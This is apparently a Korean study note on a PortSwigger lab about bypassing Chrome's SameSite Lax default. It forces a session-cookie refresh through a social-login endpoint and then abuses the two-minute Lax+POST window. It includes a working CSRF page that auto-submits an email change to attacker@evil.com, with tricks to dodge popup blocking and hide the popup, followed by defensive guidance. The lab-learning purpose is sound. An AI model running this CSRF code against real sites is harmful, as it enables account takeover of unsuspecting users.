# Lab: SameSite Lax bypass via cookie refresh

## 개요

- **난이도**: Practitioner
- **주제**: Cross-Site Request Forgery (CSRF) — SameSite 미설정 / Chrome Lax+POST 예외 / 쿠키 갱신 강제
- **링크**: https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-cookie-refresh

## 목표

`SameSite` 속성이 설정되지 않은 쿠키를 사용하는 사이트에서, Chrome의 "2분 Lax+POST 예외" 동작을 악용한다. 쿠키 갱신을 강제로 유발하여 2분 예외 창을 열고, 그 안에서 CSRF POST 요청을 전송해 이메일을 변경한다.

## Chrome의 SameSite 기본값과 예외

### SameSite 미설정 시 기본 동작

```
Set-Cookie: session=VALUE  ← SameSite 속성 없음

브라우저별 처리:
  Chrome 80+ : SameSite=Lax 로 처리 (기본값 적용)
  Firefox    : SameSite=None 으로 처리 (레거시)
  Safari     : 자체 ITP 정책 적용

→ Chrome: SameSite 미설정 쿠키 = Lax 처럼 동작
  외부 사이트 POST → 쿠키 미전송 (Lax 적용)
  외부 사이트 GET 탑레벨 → 쿠키 전송
```

### Chrome의 "Lax+POST" 2분 예외

```
Chrome 특수 동작 (Lax-allowing-unsafe):

  쿠키가 탑레벨 네비게이션으로 새로 발급된 후 2분 이내:
  → 크로스 사이트 POST 요청에도 쿠키 전송!
  ↑ SameSite=Lax 의 POST 차단 규칙이 일시적으로 적용 안 됨

  2분 경과 후:
  → 일반 Lax 규칙 적용 → 크로스 사이트 POST 차단

이유: SSO/OAuth 등 쿠키 발급 직후 POST 리다이렉트가 필요한
      레거시 로그인 흐름과의 호환성 유지를 위해 도입된 예외
```

```
타임라인:
  T+0s  : 탑레벨 GET → 서버가 새 session 쿠키 발급
  T+0~120s: Lax+POST 예외 → 크로스 사이트 POST 에도 쿠키 전송 (취약)
  T+120s+ : 예외 종료 → Lax 기본 적용 → 크로스 사이트 POST 차단
```

## 취약점 분석

```
[일반 상황 — 공격 실패]
  피해자 로그인 후 오래 지남 (session 쿠키 2분 경과)
  공격자 → CSRF POST 전송
  → Chrome: 2분 지남 → Lax 적용 → 쿠키 미전송 → 공격 실패

[쿠키 갱신 강제 — 공격 성공]
  공격자: 피해자 브라우저에서 서버가 쿠키를 재발급하도록 유도
  → 2분 예외 창 재오픈
  → 즉시 CSRF POST 전송
  → 쿠키 첨부됨 → 공격 성공
```

## 쿠키 갱신 방법 — OAuth/소셜 로그인

```
대상 사이트에 /social-login 엔드포인트 존재:
  사용자가 방문하면 OAuth 플로우를 통해 session 쿠키 재발급

공격자:
  1. 피해자 브라우저에서 /social-login 을 탑레벨 GET 요청으로 열기
     → 서버가 session 쿠키 재발급 → 2분 예외 창 시작
  2. 즉시(또는 수백ms 이내) CSRF POST 전송
     → 2분 예외 적용 중 → 쿠키 첨부 → 공격 성공
```

## 공격 방법

### 페이로드

```html
<!-- exploit server 에 호스팅 -->
<html>
  <body>
    <script>
      // 1단계: 팝업으로 /social-login 열기 → 쿠키 재발급 (탑레벨 GET)
      window.open('https://VULNERABLE.com/social-login');

      // 2단계: 쿠키 재발급 완료까지 잠시 대기 후 CSRF 폼 제출
      setTimeout(function() {
        document.forms[0].submit();
      }, 2000);  // 2초 대기 (쿠키 갱신 완료 후, 2분 예외 창 안)
    </script>

    <!-- CSRF 폼 (아직 제출 안 함) -->
    <form action="https://VULNERABLE.com/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="attacker@evil.com">
    </form>
  </body>
</html>
```

### 실행 흐름

```
1. 피해자가 exploit 페이지 방문

2. window.open('/social-login'):
   새 탭에서 탑레벨 GET 요청 → OAuth 플로우
   서버: session 쿠키 재발급 (새 쿠키 발급 → 2분 타이머 시작)

3. setTimeout(2000ms):
   2초 대기 → 쿠키 재발급 완료를 기다림

4. 폼 자동 제출:
   POST /my-account/change-email
   Cookie: session=VICTIM_SESSION  ← 2분 이내 → Lax+POST 예외 → 전송!
   Body: email=attacker@evil.com

5. 서버: 이메일 변경 처리

6. (옵션) 팝업 자동 닫기:
   window.open 으로 연 탭을 setTimeout 전에 close() 호출
```

### 팝업 차단 우회 고려

```javascript
// 브라우저는 사용자 인터랙션 없는 window.open 을 차단할 수 있음
// → 클릭 이벤트로 팝업 열기

document.addEventListener('click', function() {
    window.open('https://VULNERABLE.com/social-login');
    setTimeout(() => document.forms[0].submit(), 2000);
});
// → 또는 onclick 속성으로 트리거

// 팝업 열자마자 닫기 (피해자가 인지 못하도록)
const popup = window.open('https://VULNERABLE.com/social-login');
setTimeout(() => { popup.close(); }, 500);
setTimeout(() => { document.forms[0].submit(); }, 2000);
```

## 이전 랩들과의 비교

| 항목 | 007 랩 | 008 랩 | 009 랩 | 010 랩 (이번) |
|------|--------|--------|--------|--------------|
| 우회 대상 | SameSite=Lax | SameSite=Strict | SameSite=Strict | SameSite 미설정 (Lax 기본값) |
| 핵심 취약점 | `_method` 오버라이드 | JS 리다이렉트 경로 | Sibling Domain XSS | Chrome 2분 Lax+POST 예외 |
| 쿠키 전송 조건 | GET 탑레벨 허용 | Same-site 리다이렉트 | Same-site XSS | 쿠키 재발급 후 2분 이내 |
| 추가 준비 | 없음 | 없음 | XSS 페이로드 작성 | 쿠키 갱신 강제 (팝업/탭) |

## 핵심 정리

- `SameSite` 속성을 명시하지 않으면 Chrome은 Lax를 기본 적용하지만, **쿠키 발급 후 2분간** 크로스 사이트 POST도 허용하는 예외가 있다.
- 이 예외는 OAuth 등 레거시 로그인 플로우와의 호환성 때문에 도입되었다.
- 공격자가 `/social-login` 같은 엔드포인트를 탑레벨 GET으로 열어 **쿠키 재발급을 강제**하면, 2분 예외 창을 임의로 재시작할 수 있다.
- **방어**:
  - 쿠키에 `SameSite=Lax` 또는 `SameSite=Strict` 를 **명시적으로** 설정 (기본값 의존 금지)
  - `SameSite=Strict` 명시 설정 시 2분 예외 없음
  - CSRF 토큰 병행 사용

## 배운 점 및 추가 학습

### 1. SameSite 미설정 vs 명시 설정의 차이

```
[미설정]
  Set-Cookie: session=VALUE
  Chrome: Lax 처럼 동작 + 2분 Lax+POST 예외 적용
  → 이번 랩의 취약점

[명시 설정 — Lax]
  Set-Cookie: session=VALUE; SameSite=Lax
  Chrome: Lax 적용, 2분 예외 없음
  → 쿠키 재발급 후에도 크로스 사이트 POST 차단

[명시 설정 — Strict]
  Set-Cookie: session=VALUE; SameSite=Strict
  Chrome: Strict 적용, 예외 없음
  → 외부 GET 탑레벨도 차단 (가장 강력)

교훈: SameSite 는 반드시 명시적으로 설정할 것
     미설정 = 브라우저 구현 의존 = 예외 동작 허용
```

### 2. Chrome의 Lax+POST 예외 역사

```
배경:
  Chrome 80 (2020년): SameSite 미설정 → Lax 기본값 전환
  문제: 일부 OAuth/SAML 로그인은 POST 리다이렉트를 사용
       새 쿠키 발급 후 즉시 POST 폼 제출 필요
       → Lax 기본값으로 인해 로그인 깨짐

해결책으로 도입된 예외:
  "Lax-allowing-unsafe" (= Lax+POST 2분 예외)
  쿠키 발급 직후 2분간 unsafe method(POST 등) 허용
  → 레거시 OAuth 플로우 호환성 유지

보안 영향:
  이 예외가 존재하는 한, SameSite 미설정 쿠키는
  완전한 Lax 보호를 받지 못함
  → 반드시 명시적 SameSite=Lax 또는 Strict 설정 필요
```

### 3. OAuth 쿠키 재발급 흐름의 구조

```
정상 OAuth 흐름:
  1. /social-login (GET) → 제공자로 리다이렉트
  2. 제공자 로그인 완료 → 콜백 URL 로 POST
  3. 서버: OAuth 토큰 검증 → session 쿠키 신규 발급
  4. 응답: Set-Cookie: session=NEW_VALUE

공격자의 악용:
  피해자가 이미 로그인되어 있어도
  /social-login 을 방문하면 새 쿠키가 재발급됨
  → 2분 예외 창 재시작
  → 이미 유효한 세션이지만 새로 발급한 것처럼 처리됨
```

### 4. window.open 의 SameSite 컨텍스트

```javascript
// window.open 으로 열린 페이지는 "탑레벨 네비게이션"
window.open('https://target.com/social-login');
// → 탑레벨 GET 요청 → SameSite=Lax 허용
// → 서버가 쿠키 재발급 → 2분 예외 시작

// iframe 은 탑레벨 네비게이션이 아님
// <iframe src="https://target.com/social-login">
// → 서드파티 컨텍스트 → 쿠키 발급이 탑레벨 발급으로 인정 안 될 수 있음
// → window.open 또는 location.href 를 통한 탑레벨 이동 필요

// 2분 안에 CSRF 전송:
setTimeout(() => document.forms[0].submit(), 1000);  // 1초 후 전송
// → 2분 이내이므로 Lax+POST 예외 적용 → 쿠키 첨부됨
```

### 5. CSRF 방어 체크리스트

```
✓ SameSite 명시 설정 (미설정 금지)
  → Set-Cookie: session=V; SameSite=Lax     (최소)
  → Set-Cookie: session=V; SameSite=Strict  (권장)

✓ CSRF 토큰 병행 사용
  → SameSite 우회 시 CSRF 토큰이 2차 방어

✓ Referer/Origin 헤더 검증
  → 요청 출처 서버 사이드 확인

✓ 상태 변경 작업에 사용자 재인증 요구
  → 이메일 변경, 비밀번호 변경 등에 현재 비밀번호 입력 요구

✓ Double Submit Cookie 사용 시 HMAC 서명
  → 단순 값 일치 검증 금지 (006 랩 참조)
```
